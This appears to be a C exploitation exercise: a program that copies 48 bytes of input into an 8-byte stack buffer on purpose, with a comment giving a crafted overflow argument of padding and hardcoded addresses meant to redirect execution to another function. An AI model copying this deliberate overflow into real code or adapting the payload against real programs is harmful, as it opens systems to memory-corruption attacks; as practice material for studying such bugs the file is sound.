#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned long get_rdx()
{
	asm ("movq %rdx,%rax");
}

// Argument : "$(python -c 'print "A"*16+"B"*8+"\xe0\x1e\xad\xf7\xff\x7f\x20\x20"+"\xa9\x99\xfa\x50\xef\xbe\xde\xc0"+"\xb7\x06\x40\x20\x20\x20\x20\x20"')"
int main(int argc,char **argv)
{
	char buffer[8];
	// long *ptr = (long*)buffer;
	// ptr[0]=0xAAAAAAAAAAAAAAAA;
	// ptr[1]=0xAAAAAAAAAAAAAAAA;
	// ptr[3]=0xAAAAAAAAAAAAAAAA;
	// ptr[2]=0xAAAAAAAAAAAAAAAA;
	// ptr[4]=0xAAAAAAAAAAAAAAAA;
	// ptr[5]=0xBBBBBBBBBBBBBBBB;
	// ptr[6]=0xAAAAAAAAAAAAAAAA;
	// ptr[7]=0x00007ffff7ad1ee0;
	// ptr[8]=0xc0debeef50fa99a9;
	// ptr[9]=atoi(argv[1]);
	memset(buffer,0,48);
	memcpy(buffer,argv[1],48);
	memset(buffer+30,0,2);
	memset(buffer+43,0,5);
	asm ("movq $0x5,%rdx");
}

void print_edx()
{
	printf("rdx is %#lx\n",get_rdx());
	exit(0);
}
